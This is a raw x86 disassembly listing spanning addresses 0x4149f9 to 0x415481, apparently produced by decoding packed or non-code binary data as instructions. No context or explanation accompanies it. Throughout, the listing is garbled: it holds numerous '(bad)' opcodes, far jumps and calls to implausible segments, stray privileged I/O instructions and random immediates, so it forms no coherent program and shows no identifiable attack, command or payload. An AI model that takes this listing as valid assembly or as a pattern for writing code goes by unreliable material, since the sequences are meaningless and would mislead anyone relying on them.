  4149f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149fa:	fistp  QWORD PTR [eax+0x8b30b75]
  414a00:	cld    
  414a01:	sbb    esp,DWORD PTR [edi]
  414a03:	(bad)  
  414a04:	or     DWORD PTR [edx-0x46],eax
  414a07:	nop
  414a08:	pop    edx
  414a09:	mov    cl,0xa7
  414a0b:	aas    
  414a0c:	aas    
  414a0d:	mov    cl,0x9a
  414a0f:	repz out dx,al
  414a11:	(bad)  
  414a12:	fnsave [eax+ebx*8+0x35d41f82]
  414a19:	(bad)  
  414a1a:	sub    ebx,DWORD PTR [edi-0x4e1ae27e]
  414a20:	push   esp
  414a21:	or     edx,DWORD PTR [esi]
  414a23:	fs pop edx
  414a25:	cld    
  414a26:	data16 jmp 0x414a16
  414a29:	jb     0x85b0fe73
  414a2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a30:	mov    DWORD PTR [esi+0x328d9307],edx
  414a36:	cld    
  414a37:	daa    
  414a38:	add    al,0x72
  414a3a:	mov    edx,0x3a95ca27
  414a3f:	dec    edx
  414a40:	sar    DWORD PTR [esp+eax*4+0x909132e],cl
  414a47:	cld    
  414a48:	mov    bh,0x6a
  414a4a:	call   0x1c0f:0x52855fd
  414a51:	ret    0x9b3e
  414a54:	fwait
  414a55:	mov    cl,0xf8
  414a57:	scas   eax,DWORD PTR es:[edi]
  414a58:	inc    ebx
  414a59:	sbb    cl,BYTE PTR [edi-0x2b9645a9]
  414a5f:	xchg   DWORD PTR [ecx],ebp
  414a61:	jmp    0x38a1:0xf85df870
  414a68:	and    dl,dh
  414a6a:	xchg   ecx,eax
  414a6b:	jo     0x414a3a
  414a6d:	outs   dx,BYTE PTR ds:[esi]
  414a6e:	mov    ebp,0x93158891
  414a73:	adc    DWORD PTR [ecx+0x3e],esp
  414a76:	mov    ebx,0x2db8a54a
  414a7b:	mov    al,0x11
  414a7d:	pop    eax
  414a7e:	out    0x76,eax
  414a80:	pop    ebx
  414a81:	loop   0x414a71
  414a83:	cli    
  414a84:	sub    ebx,ebp
  414a86:	adc    eax,0x5e90589d
  414a8b:	int3   
  414a8c:	jb     0x414a9b
  414a8e:	fisttp DWORD PTR [ecx+0x6552ebe4]
  414a94:	sar    BYTE PTR [edi-0x6e],1
  414a97:	gs jnp 0x414a9f
  414a9a:	add    ah,BYTE PTR [edi+0x35329624]
  414aa0:	les    edx,FWORD PTR [ebx-0x746b5676]
  414aa6:	mov    al,0x58
  414aa8:	sub    al,0x9d
  414aaa:	adc    DWORD PTR [eax+0x7e],edi
  414aad:	inc    esp
  414aae:	jp     0x414adb
  414ab0:	inc    ecx
  414ab1:	in     eax,dx
  414ab2:	push   eax
  414ab3:	and    edi,esp
  414ab5:	loopne 0x414b25
  414ab7:	mov    al,ds:0xe6b52b81
  414abc:	lods   eax,DWORD PTR ds:[esi]
  414abd:	pop    edi
  414abe:	hlt    
  414abf:	sub    edi,0xc7ec96d3
  414ac5:	pop    ebp
  414ac6:	retf   
  414ac7:	add    DWORD PTR [edi+0x6a7fcb42],esp
  414acd:	stos   DWORD PTR es:[edi],eax
  414ace:	(bad)  
  414acf:	(bad)  
  414ad0:	mov    dl,0xef
  414ad2:	push   esp
  414ad3:	pop    edi
  414ad4:	pushf  
  414ad5:	je     0x414ad6
  414ad7:	cmp    esi,eax
  414ad9:	sub    BYTE PTR [edx-0x6c],ah
  414adc:	aas    
  414add:	outs   dx,BYTE PTR ds:[esi]
  414ade:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414adf:	push   0xde67b2c
  414ae4:	fcomp  QWORD PTR [ebx+0x20a4dc80]
  414aea:	mov    ch,BYTE PTR [esi-0x77]
  414aed:	cmp    BYTE PTR [eax],al
	...
  414b53:	add    BYTE PTR [eax],al
  414b55:	add    BYTE PTR [edi+0x7e363ed9],bl
  414b5b:	neg    DWORD PTR [edi-0x265c9d07]
  414b61:	arpl   WORD PTR [eax+0xc],ax
  414b64:	loopne 0x414b75
  414b66:	fild   WORD PTR [bx+si]
  414b69:	add    BYTE PTR [eax],al
  414b6b:	add    DWORD PTR [eax],eax
  414b6d:	add    BYTE PTR [ebx+0x1c8e091c],al
  414b73:	add    cl,0x30
  414b76:	repnz aad 0xc
  414b79:	adc    eax,0xa5527325
  414b7e:	jmp    0xbbeac2a2
  414b83:	pop    eax
  414b84:	fcomp  DWORD PTR [ebx-0x1d30845a]
  414b8a:	(bad)  
  414b8c:	mov    edx,0x55c69ff3
  414b91:	ret    
  414b92:	inc    ebp
  414b93:	das    
  414b94:	mov    edx,?
  414b96:	not    DWORD PTR [edi-0x6c]
  414b99:	or     ch,BYTE PTR [ebx+0x2c4de996]
  414b9f:	or     DWORD PTR [edx],ecx
  414ba1:	dec    edx
  414ba2:	inc    eax
  414ba3:	adc    eax,0xdd62b513
  414ba8:	or     eax,0xc3a4cb07
  414bad:	sub    al,0xb5
  414baf:	scas   al,BYTE PTR es:[edi]
  414bb0:	mov    bh,0x7a
  414bb2:	outs   dx,DWORD PTR ds:[esi]
  414bb3:	sub    ecx,DWORD PTR [esp+ecx*8]
  414bb6:	push   ebp
  414bb7:	and    ah,0xb8
  414bba:	jg     0x414c31
  414bbc:	jecxz  0x414c1c
  414bbe:	pusha  
  414bbf:	(bad)  
  414bc0:	mov    cl,0xb6
  414bc2:	icebp  
  414bc3:	push   edx
  414bc4:	cmp    BYTE PTR [edi-0x66],ah
  414bc7:	xchg   esp,eax
  414bc8:	inc    edi
  414bc9:	loop   0x414b81
  414bcb:	mov    al,0xf4
  414bcd:	aaa    
  414bce:	sub    DWORD PTR [edi+0x241a94f1],esi
  414bd4:	in     al,dx
  414bd5:	rcl    BYTE PTR gs:[ebx+0xe],1
  414bd9:	js     0x414ba7
  414bdb:	shl    DWORD PTR [ecx+0x12771bf5],0x7b
  414be2:	pop    ebp
  414be3:	add    BYTE PTR [ebx-0x31],ah
  414be6:	add    ah,BYTE PTR [ecx]
  414be8:	sub    al,0x71
  414bea:	sbb    eax,DWORD PTR [ecx-0x6f85aaf1]
  414bf0:	sbb    al,0xb1
  414bf2:	mov    ebp,0xe9432040
  414bf7:	arpl   WORD PTR [edi],cx
  414bf9:	loope  0x414b9a
  414bfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bfc:	sbb    al,0xef
  414bfe:	xor    ebp,DWORD PTR [esi+edi*2]
  414c01:	out    dx,al
  414c02:	jmp    0x414bc7
  414c04:	xlat   BYTE PTR ds:[ebx]
  414c05:	xchg   BYTE PTR ds:0xf70558b1,al
  414c0b:	(bad)  
  414c0c:	pusha  
  414c0d:	mov    bh,0xf7
  414c0f:	push   edi
  414c10:	inc    edi
  414c11:	test   ah,dl
  414c13:	fist   WORD PTR [edx+eax*2-0x144f4336]
  414c1a:	es dec eax
  414c1c:	pop    es
  414c1d:	push   edi
  414c1e:	outs   dx,BYTE PTR ds:[esi]
  414c1f:	sahf   
  414c20:	ins    BYTE PTR es:[edi],dx
  414c21:	or     bl,BYTE PTR [ebx]
  414c23:	fild   QWORD PTR [edi-0x5e6428ef]
  414c29:	test   DWORD PTR [edx-0x53c79641],eax
  414c2f:	xchg   ebx,eax
  414c30:	hlt    
  414c31:	outs   dx,BYTE PTR ds:[esi]
  414c32:	ret    
  414c33:	ins    BYTE PTR es:[edi],dx
  414c34:	and    cl,BYTE PTR [edx+0x3fbb645]
  414c3a:	out    0x6c,al
  414c3c:	xor    ebp,DWORD PTR [ecx-0x28]
  414c3f:	and    BYTE PTR [edi-0x50085c1b],bh
  414c45:	dec    esp
  414c46:	js     0x414bde
  414c48:	mov    esp,0xb867e83b
  414c4d:	mov    eax,0x80ab1e45
  414c52:	mov    DWORD PTR [esi],esi
  414c54:	xor    DWORD PTR [eax+0xdade5ad],eax
  414c5a:	and    eax,0x3740dad6
  414c5f:	dec    edx
  414c60:	out    0x15,eax
  414c62:	leave  
  414c63:	push   ds
  414c64:	pop    ebp
  414c65:	mov    ds:0x9caacd18,al
  414c6a:	push   edx
  414c6b:	test   eax,0x399c
	...
  414cd4:	add    BYTE PTR [eax],al
  414cd6:	xor    al,0x64
  414cd8:	push   ds
  414cd9:	jl     0x414d39
  414cdb:	jle    0x414d53
  414cdd:	ins    BYTE PTR es:[edi],dx
  414cde:	out    0x12,al
  414ce0:	cs adc eax,edx
  414ce3:	int    0x0
  414ce5:	retf   0xe067
  414ce8:	add    BYTE PTR [eax],al
  414cea:	add    BYTE PTR [ecx],al
  414cec:	add    BYTE PTR [eax],al
  414cee:	mov    bh,0x8c
  414cf0:	dec    eax
  414cf1:	out    0x8b,eax
  414cf3:	xor    DWORD PTR [edi-0x35],esi
  414cf6:	stc    
  414cf7:	inc    ebp
  414cf8:	shl    BYTE PTR [edx],0x3b
  414cfb:	jo     0x414cda
  414cfd:	pushf  
  414cfe:	dec    BYTE PTR [ebx]
  414d00:	fs (bad) 
  414d02:	jo     0x414cf7
  414d04:	(bad)  
  414d05:	mov    ax,0xc9fa
  414d09:	mov    WORD PTR [edx+0x63],fs
  414d0c:	mov    al,0xad
  414d0e:	adc    edx,DWORD PTR [esi]
  414d10:	sbb    eax,0x44e30d57
  414d15:	in     eax,dx
  414d16:	mov    cl,0x72
  414d18:	or     edx,DWORD PTR [edx]
  414d1a:	pop    es
  414d1b:	mov    DWORD PTR [ebx],0x55db051d
  414d21:	cli    
  414d22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d23:	inc    eax
  414d24:	or     eax,0x563d5133
  414d29:	adc    BYTE PTR cs:[ebx+0x1aa7bc8],ah
  414d30:	stc    
  414d31:	ret    
  414d32:	pop    ebp
  414d33:	aam    0x1
  414d35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d36:	cmp    eax,0xc0590565
  414d3b:	scas   eax,DWORD PTR es:[edi]
  414d3c:	popf   
  414d3d:	das    
  414d3e:	in     al,dx
  414d3f:	jmp    0x45c:0x6b94142c
  414d46:	xor    ch,BYTE PTR [ecx]
  414d48:	sbb    BYTE PTR [ebx+0x2d],ch
  414d4b:	fst    DWORD PTR [edx]
  414d4d:	mov    bl,0x2b
  414d4f:	fwait
  414d50:	lds    edi,FWORD PTR [ebx]
  414d52:	in     al,dx
  414d53:	adc    cl,BYTE PTR [eax-0x14f08378]
  414d59:	push   0xfe75de92
  414d5e:	stc    
  414d5f:	ret    
  414d60:	jbe    0x414ced
  414d62:	fsub   QWORD PTR es:[esi+0x21ff8a05]
  414d69:	sbb    edx,DWORD PTR [ebp-0x1b8bec7f]
  414d6f:	bound  esp,QWORD PTR [eax+0x60e53ad2]
  414d75:	inc    edi
  414d76:	inc    ecx
  414d77:	xlat   BYTE PTR ds:[ebx]
  414d78:	cmp    BYTE PTR [edi],dl
  414d7a:	fisttp DWORD PTR [esi]
  414d7c:	jle    0x414dd7
  414d7e:	pushf  
  414d7f:	push   0xffffffa2
  414d81:	ss stos DWORD PTR es:[edi],eax
  414d83:	mov    ebx,0xf2426749
  414d88:	mov    dh,0xef
  414d8a:	add    ah,bl
  414d8c:	dec    edx
  414d8d:	rcr    DWORD PTR fs:[eax],1
  414d90:	cld    
  414d91:	stos   DWORD PTR es:[edi],eax
  414d92:	sbb    dl,BYTE PTR [ebp+0x42d7779b]
  414d98:	sahf   
  414d99:	lea    esp,[eax-0x29]
  414d9c:	data16 jbe 0x414db1
  414d9f:	mov    dl,0x6c
  414da1:	push   es
  414da2:	lock rcl DWORD PTR [ebx],cl
  414da5:	out    0xde,al
  414da7:	data16 or BYTE PTR [edi+0x11fcc303],0xbb
  414daf:	pop    es
  414db0:	push   esp
  414db1:	ins    DWORD PTR es:[edi],dx
  414db2:	pushf  
  414db3:	or     DWORD PTR [ebp-0x2b90ab52],0xffffffd2
  414dba:	popa   
  414dbb:	add    eax,0xc3190e53
  414dc0:	sub    ecx,edi
  414dc2:	mov    ds:0x73dc70ca,eax
  414dc7:	jnp    0x414d63
  414dc9:	mov    edx,DWORD PTR [eax-0x783e2f10]
  414dcf:	out    dx,eax
  414dd0:	mov    ecx,0xfdbf5c19
  414dd5:	inc    eax
  414dd6:	sbb    BYTE PTR [ebp-0x76c2017d],dl
  414ddc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ddd:	in     al,0xf
  414ddf:	cmp    BYTE PTR [edx+0x4db5205e],cl
  414de5:	aaa    
  414de6:	fwait
  414de7:	and    eax,0x9eca3ecb
  414dec:	xchg   ebx,eax
  414ded:	mov    cl,0x0
	...
  414e53:	add    BYTE PTR [eax],al
  414e55:	add    BYTE PTR [edi+0x3e911299],dh
  414e5b:	fwait
  414e5c:	mov    bh,0xbf
  414e5e:	in     al,dx
  414e5f:	xor    dh,BYTE PTR [esi]
  414e61:	adc    eax,0x7f4d273
  414e66:	addr16 loope 0x414e69
  414e69:	add    BYTE PTR [eax],al
  414e6b:	add    DWORD PTR [eax],eax
  414e6d:	add    BYTE PTR [ebx+0x55b52652],cl
  414e73:	mov    ch,0x2c
  414e75:	inc    edi
  414e76:	jecxz  0x414e22
  414e78:	outs   dx,BYTE PTR ds:[esi]
  414e79:	cmp    eax,0xa39b43a2
  414e7e:	adc    al,0x1f
  414e80:	pop    ebx
  414e81:	sub    BYTE PTR [edx-0x56],bh
  414e84:	outs   dx,DWORD PTR ds:[esi]
  414e85:	cmp    BYTE PTR [edx-0x10],al
  414e88:	inc    esp
  414e89:	dec    eax
  414e8a:	lods   eax,DWORD PTR ds:[esi]
  414e8b:	aaa    
  414e8c:	dec    ebx
  414e8d:	xor    DWORD PTR [ebx-0x15],eax
  414e90:	test   eax,0x94a9508d
  414e95:	jmp    DWORD PTR [edx-0x7fb47bb9]
  414e9b:	sar    DWORD PTR [eax+0x1e],1
  414e9e:	mov    ds:0x57d1317,al
  414ea3:	fidivr WORD PTR [ebx-0x2d]
  414ea6:	jmp    0x414e94
  414ea8:	aam    0x8f
  414eaa:	adc    DWORD PTR [esi],esp
  414eac:	xchg   ecx,eax
  414ead:	stc    
  414eae:	mov    eax,ds:0xeb5d6a18
  414eb3:	push   es
  414eb4:	cmp    BYTE PTR [eax+0x17],ch
  414eb7:	adc    DWORD PTR [ecx-0x714d5455],esi
  414ebd:	imul   eax
  414ebf:	out    0x71,eax
  414ec1:	adc    al,0xbd
  414ec3:	xor    DWORD PTR [eax],esi
  414ec5:	pop    ecx
  414ec6:	xchg   bh,ah
  414ec8:	and    esp,ebp
  414eca:	fmul   st(2),st
  414ecc:	or     ebx,eax
  414ece:	adc    ebp,DWORD PTR ds:0x60005b9b
  414ed4:	inc    ecx
  414ed5:	inc    esi
  414ed6:	mov    esi,0xa6169bcf
  414edb:	repz mov esi,0xd1c90a12
  414ee1:	jo     0x414e95
  414ee3:	mov    ds,WORD PTR [ebp+eax*4-0x55]
  414ee7:	std    
  414ee8:	in     al,dx
  414ee9:	and    al,BYTE PTR [esp+ecx*4-0x4ac3b21e]
  414ef0:	pop    ebp
  414ef1:	(bad)  
  414ef3:	jnp    0x414f40
  414ef5:	aaa    
  414ef6:	fst    DWORD PTR [ebx]
  414ef8:	imul   ebp,DWORD PTR [edi-0x7],0x3e63e0b1
  414eff:	jbe    0x414ea7
  414f01:	add    al,0x2f
  414f03:	iret   
  414f04:	add    al,0x51
  414f06:	or     eax,0x13be0ce8
  414f0b:	xor    esi,DWORD PTR ds:[edi+0x18]
  414f0f:	or     eax,0xee1c0781
  414f14:	cmp    al,BYTE PTR [ebx-0x4a7bd6e3]
  414f1a:	mov    dl,0x21
  414f1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f1d:	mov    ds:0x9be64c21,al
  414f22:	ins    DWORD PTR es:[edi],dx
  414f23:	addr16 pop esp
  414f25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f26:	int    0xd0
  414f28:	loop   0x414f14
  414f2a:	and    BYTE PTR [esi-0x3728ecfb],bl
  414f30:	jne    0x414f6b
  414f32:	in     al,0xcb
  414f34:	stc    
  414f35:	ja     0x414eef
  414f37:	xor    esi,esp
  414f39:	sub    DWORD PTR [ecx],ebp
  414f3b:	fist   WORD PTR [ecx-0x1becc9a3]
  414f41:	ins    DWORD PTR es:[edi],dx
  414f42:	je     0x414ef8
  414f44:	push   0xca1293f3
  414f49:	rcr    BYTE PTR [eax],cl
  414f4b:	shl    BYTE PTR [esi],cl
  414f4d:	jp     0x414f4a
  414f4f:	jle    0x414f3e
  414f51:	sub    eax,0x3d24ca31
  414f56:	jp     0x414f1b
  414f58:	loope  0x414eea
  414f5a:	ds ja  0x414f78
  414f5d:	ror    DWORD PTR [edx],cl
  414f5f:	(bad)  
  414f60:	call   0xe543e99e
  414f65:	jne    0x414f6a
  414f67:	into   
  414f68:	cmc    
  414f69:	sbb    al,0x32
  414f6b:	stos   DWORD PTR es:[edi],eax
  414f6c:	cmp    eax,0x1a
	...
  414fd5:	add    BYTE PTR [edi],dh
  414fd7:	data16 xor al,0x9b
  414fda:	jne    0x414fb7
  414fdc:	mov    edi,0xe45ae5ee
  414fe1:	call   0xe267:0x557ed172
  414fe8:	add    BYTE PTR [eax],al
  414fea:	add    BYTE PTR [ecx],al
  414fec:	add    BYTE PTR [eax],al
  414fee:	lahf   
  414fef:	xor    al,0xa1
  414ff1:	or     eax,0x7b78ee38
  414ff6:	xchg   DWORD PTR [ecx],esi
  414ff8:	xchg   ecx,eax
  414ff9:	sbb    dh,al
  414ffb:	int    0xe3
  414ffd:	loope  0x414ff9
  414fff:	jp     0x414fb0
  415001:	sahf   
  415002:	add    cl,BYTE PTR [edi+0x7d]
  415005:	pop    eax
  415006:	xchg   ecx,eax
  415007:	push   es
  415008:	mov    dh,0x27
  41500a:	rol    esp,0x86
  41500d:	lds    ebp,FWORD PTR [esi-0x3e]
  415010:	jp     0x415034
  415012:	cmp    al,0x28
  415014:	out    dx,al
  415015:	cld    
  415016:	mov    edi,0xfbfe8801
  41501b:	sbb    esp,DWORD PTR [edi]
  41501d:	xchg   DWORD PTR [ebx-0x74],edx
  415020:	sub    BYTE PTR [edi+0x118962f],0x3a
  415027:	cmc    
  415028:	aas    
  415029:	pop    ebx
  41502a:	add    BYTE PTR [ebx-0x6302356f],dl
  415030:	sbb    bh,bh
  415032:	sbb    DWORD PTR [edx+esi*4-0x57bd5bf6],0xffffffa3
  41503a:	add    al,BYTE PTR [esi]
  41503c:	pop    edi
  41503d:	cmp    ecx,DWORD PTR cs:[ebx]
  415040:	mov    eax,ds:0xef861099
  415045:	pushf  
  415046:	or     esi,DWORD PTR ds:0xbfdd4c97
  41504c:	sub    al,0x1d
  41504e:	adc    eax,0xba75cad9
  415053:	cld    
  415054:	cwde   
  415055:	stos   BYTE PTR es:[edi],al
  415056:	mov    ebp,DWORD PTR [edi]
  415058:	and    al,0x73
  41505a:	mov    ch,0x30
  41505c:	addr16 (bad) 
  41505e:	icebp  
  41505f:	sar    BYTE PTR [edx+0x21479474],0xa1
  415066:	xchg   ebp,eax
  415067:	mov    ch,0x59
  415069:	xchg   ebp,eax
  41506a:	mov    edi,0x6c80dcb4
  41506f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415070:	and    al,0xf1
  415072:	xchg   ebp,eax
  415073:	aad    0xb1
  415075:	enter  0x60b8,0x1c
  415079:	jge    0x41503d
  41507b:	and    BYTE PTR [esi+0x3d548bb9],ah
  415081:	push   ecx
  415082:	add    ah,dh
  415084:	adc    BYTE PTR [esp+ebp*2+0x712b25c2],bl
  41508b:	addr16 xchg edx,eax
  41508d:	shr    BYTE PTR [edi-0x2c0b411],cl
  415093:	mov    ch,0x88
  415095:	lds    esi,FWORD PTR [esi]
  415097:	push   ss
  415098:	dec    esp
  415099:	jge    0x4150a9
  41509b:	pop    ebx
  41509c:	pop    es
  41509d:	add    eax,0xdcb8058b
  4150a2:	into   
  4150a3:	scas   eax,DWORD PTR es:[edi]
  4150a4:	adc    ch,BYTE PTR [edi+ebp*4+0x43e9412]
  4150ab:	fcom   st(0)
  4150ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150ae:	je     0x4150fa
  4150b0:	pusha  
  4150b1:	jb     0x41512b
  4150b3:	dec    ebx
  4150b4:	dec    ebp
  4150b5:	sub    eax,0x5a27e201
  4150ba:	(bad)  [ecx]
  4150bc:	jmp    0xe184615e
  4150c1:	jnp    0x415076
  4150c3:	adc    ebp,esp
  4150c5:	dec    ecx
  4150c6:	pop    eax
  4150c7:	test   DWORD PTR [esi+0x24789816],eax
  4150cd:	jnp    0x14ec5bde
  4150d3:	xchg   edx,eax
  4150d4:	push   edi
  4150d5:	add    DWORD PTR [ebx+0x5d80bb61],eax
  4150db:	sar    BYTE PTR [ecx-0x40],cl
  4150de:	int    0xea
  4150e0:	(bad)  [ebx-0x4c]
  4150e3:	aam    0x78
  4150e5:	out    0xfb,al
  4150e7:	stc    
  4150e8:	xor    eax,0x9a67cd71
  4150ed:	add    BYTE PTR [eax],0x0
	...
  415154:	add    BYTE PTR [eax],al
  415156:	jnp    0x41515a
  415158:	add    ebp,ebx
  41515a:	jnp    0x415147
  41515c:	sti    
  41515d:	xchg   edx,eax
  41515e:	lahf   
  41515f:	mov    esi,0xbc39fc2d
  415164:	xor    ch,bh
  415166:	jcxz   0x415169
  415169:	add    BYTE PTR [eax],al
  41516b:	add    DWORD PTR [eax],eax
  41516d:	add    BYTE PTR [ecx-0x54bc220e],cl
  415173:	pop    eax
  415174:	lea    esi,[esi+0x6bc14428]
  41517a:	dec    ebp
  41517b:	mov    WORD PTR [ecx+0x46],fs
  41517e:	ins    BYTE PTR es:[edi],dx
  41517f:	sub    DWORD PTR [esi-0x234d7512],edx
  415185:	mov    edx,DWORD PTR [eax+0x3486424e]
  41518b:	inc    esi
  41518c:	cmp    BYTE PTR [esi],0xbb
  41518f:	pusha  
  415190:	dec    esp
  415191:	(bad)  
  415192:	push   edi
  415193:	xchg   esi,eax
  415194:	ficomp WORD PTR [ebx]
  415196:	xor    eax,0x7b4b2747
  41519b:	test   eax,0x3214ee3
  4151a0:	sbb    ebx,ebp
  4151a2:	fidiv  WORD PTR [ecx+0x2c]
  4151a5:	cmc    
  4151a6:	ret    
  4151a7:	add    eax,0xf2bb79fc
  4151ac:	daa    
  4151ad:	ret    
  4151ae:	shl    BYTE PTR [edi+ebx*1-0x57b47892],0xb8
  4151b6:	imul   ebp,edi,0xfae2da54
  4151bc:	idiv   esi
  4151be:	(bad)
  4151c1:	xchg   edi,eax
  4151c2:	sti    
  4151c3:	shl    DWORD PTR [ebx+ebx*4-0x3e700c45],cl
  4151ca:	pop    esp
  4151cb:	xchg   ecx,eax
  4151cc:	adc    eax,0x4a511666
  4151d1:	dec    edx
  4151d2:	cmp    DWORD PTR [eax-0x72],ecx
  4151d5:	(bad)  [eax]
  4151d7:	adc    DWORD PTR [esi-0x3de64722],eax
  4151dd:	repnz out dx,eax
  4151df:	out    0xe8,eax
  4151e1:	adc    al,0x71
  4151e3:	push   0x6
  4151e5:	pop    ss
  4151e6:	popa   
  4151e7:	lods   al,BYTE PTR ds:[esi]
  4151e8:	shl    BYTE PTR [edx-0x438c0a08],0x9c
  4151ef:	iret   
  4151f0:	xchg   edx,eax
  4151f1:	clc    
  4151f2:	dec    edi
  4151f3:	lock fnstcw WORD PTR [edx+0x4782d092]
  4151fa:	jge    0x415197
  4151fc:	pop    edi
  4151fd:	test   BYTE PTR ds:0xa8b1afbf,al
  415203:	xor    BYTE PTR ds:[ecx-0x66],al
  415207:	stos   BYTE PTR es:[edi],al
  415208:	mov    cl,0xed
  41520a:	xor    esi,DWORD PTR [ebp+0x50]
  41520d:	outs   dx,DWORD PTR ds:[esi]
  41520e:	sub    dl,BYTE PTR [edx+0x23]
  415211:	dec    esp
  415212:	mov    bl,0x9b
  415214:	xchg   DWORD PTR [eax+0x19],ebx
  415217:	aaa    
  415218:	and    bh,BYTE PTR [edx-0x1d3cc0ed]
  41521e:	push   cs
  41521f:	pop    eax
  415220:	ficomp DWORD PTR [edi-0x6f]
  415223:	push   ebp
  415224:	jb     0x415228
  415226:	xor    esp,ebp
  415228:	hlt    
  415229:	gs pushf 
  41522b:	mov    dl,0x9e
  41522d:	shl    BYTE PTR ds:0x110f351e,cl
  415233:	inc    ebp
  415234:	dec    edx
  415235:	int3   
  415236:	mov    bh,0xf8
  415238:	outs   dx,BYTE PTR ds:[esi]
  415239:	(bad)  
  41523a:	ret    
  41523b:	sub    ah,0xbe
  41523e:	iret   
  41523f:	les    edi,FWORD PTR [eax-0x6475240c]
  415245:	lods   al,BYTE PTR ds:[esi]
  415246:	xor    edx,esi
  415248:	call   0x656e:0x4c0614f2
  41524f:	sbb    cl,BYTE PTR cs:[eax+0x3e04d69d]
  415256:	daa    
  415257:	jmp    0x415227
  415259:	bound  edx,QWORD PTR [edi+0x5c]
  41525c:	mov    al,0x60
  41525e:	sahf   
  41525f:	dec    esi
  415260:	into   
  415261:	push   ebp
  415262:	fistp  WORD PTR ds:0x78583eef
  415268:	and    DWORD PTR [eax-0x4a31cd12],esp
	...
  4152d6:	sub    al,0x97
  4152d8:	pop    ds
  4152d9:	sar    DWORD PTR [edi-0x6001127],1
  4152df:	(bad)  
  4152e0:	mov    ecx,0x76b9100b
  4152e5:	adc    esp,DWORD PTR [edi-0x1c]
  4152e8:	add    BYTE PTR [eax],al
  4152ea:	add    BYTE PTR [ecx],al
  4152ec:	add    BYTE PTR [eax],al
  4152ee:	mov    ah,0xb0
  4152f0:	aad    0x71
  4152f2:	cmp    dh,dl
  4152f4:	ret    
  4152f5:	push   esp
  4152f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152f7:	das    
  4152f8:	fwait
  4152f9:	es push edi
  4152fb:	add    bl,BYTE PTR [edi-0x19]
  4152fe:	mov    BYTE PTR [ecx],dl
  415300:	inc    eax
  415301:	dec    esp
  415302:	les    edi,FWORD PTR [ecx+0x785ca80f]
  415308:	(bad)  
  415309:	push   es
  41530a:	inc    ebp
  41530b:	loop   0x4152fe
  41530d:	mov    ah,0xa6
  41530f:	jmp    0x41529f
  415311:	xor    al,0xf4
  415313:	enter  0xa480,0xc4
  415317:	sbb    eax,DWORD PTR [edx+0x36ed11bb]
  41531d:	enter  0xb2c2,0xda
  415321:	jno    0x41530d
  415323:	sahf   
  415324:	jmp    0x38cf:0xf0687630
  41532b:	mov    cl,0xea
  41532e:	lock sub eax,0x7f902c02
  415334:	pop    ds
  415335:	leave  
  415336:	jnp    0x415382
  415338:	ins    DWORD PTR es:[edi],dx
  415339:	or     al,0x46
  41533b:	out    0x69,eax
  41533d:	mov    cs:0xafd2a56c,al
  415343:	(bad)  
  415344:	iret   
  415345:	jae    0x4153a8
  415347:	mul    DWORD PTR [edx+ebx*4]
  41534a:	mov    dl,0xd6
  41534c:	mov    esp,0xa87f1563
  415351:	xchg   edx,eax
  415352:	or     DWORD PTR [ebp+0x15],esp
  415355:	in     al,0xb5
  415357:	rol    BYTE PTR [ecx],cl
  415359:	dec    bx
  41535b:	aas    
  41535c:	sub    DWORD PTR [ebx],ebx
  41535e:	xchg   ecx,eax
  41535f:	(bad)  
  415360:	adc    edi,eax
  415362:	call   0x39e4:0x57bb9c9d
  415369:	out    0x9c,eax
  41536b:	mov    DWORD PTR [bp+0x1],0x23422f64
  415373:	sbb    dh,dh
  415375:	cs iret 
  415377:	or     eax,0x7bf119bf
  41537c:	out    0xd4,eax
  41537e:	pop    ds
  41537f:	out    0xf1,eax
  415381:	and    ecx,DWORD PTR [ecx+0xe]
  415384:	jge    0x41535a
  415386:	(bad)  
  415387:	sbb    al,0x88
  415389:	(bad)  
  41538b:	popa   
  41538c:	sub    DWORD PTR [esi+0x33],esi
  41538f:	pop    eax
  415390:	sahf   
  415391:	adc    edx,DWORD PTR [edx+0x314b1afa]
  415397:	xlat   BYTE PTR ds:[ebx]
  415398:	into   
  415399:	push   edx
  41539a:	nop
  41539b:	jg     0x4153d3
  41539d:	xchg   edx,eax
  41539e:	adc    eax,0xeb4636ca
  4153a3:	xor    eax,0x2e2f1a87
  4153a8:	inc    ebx
  4153a9:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4153ab:	les    esp,FWORD PTR [ebp-0x4f]
  4153ae:	xchg   esp,eax
  4153af:	mul    BYTE PTR [esi]
  4153b1:	push   esp
  4153b2:	jmp    0x41540a
  4153b4:	mov    ah,0x81
  4153b6:	pop    edi
  4153b7:	js     0x415394
  4153b9:	repz xchg edx,eax
  4153bb:	and    eax,0xde865e38
  4153c0:	je     0x4153e5
  4153c2:	add    ebx,esp
  4153c4:	or     BYTE PTR [eax+0x43],ch
  4153c7:	es mov eax,0x3b52b04
  4153cd:	out    dx,al
  4153ce:	pop    esp
  4153cf:	cmp    al,0x1a
  4153d1:	or     al,0x49
  4153d3:	ret    
  4153d4:	inc    esi
  4153d5:	jmp    0x43a2:0x98f49b16
  4153dc:	ror    BYTE PTR [eax+edi*2],0x68
  4153e0:	pop    DWORD PTR [ebp-0x12a5597f]
  4153e6:	fidivr DWORD PTR [edi]
  4153e8:	fdivr  QWORD PTR [edi-0x371bb7e9]
	...
  415456:	ins    DWORD PTR es:[edi],dx
  415457:	lock repz jmp FWORD PTR cs:[edi]
  41545c:	std    
  41545d:	repz mov edi,0xdcd3e5b0
  415463:	add    BYTE PTR [ebp+0xe5679c],al
  415469:	add    BYTE PTR [eax],al
  41546b:	add    DWORD PTR [eax],eax
  41546d:	add    dh,bh
  41546f:	add    eax,0x11e3ecac
  415474:	inc    ecx
  415475:	test   DWORD PTR [esi+0x6a],0x6f801e23
  41547c:	mov    ds:0xa3a6a78a,al
  415481:	xchg   DWORD PTR [edi+edi*4],eax
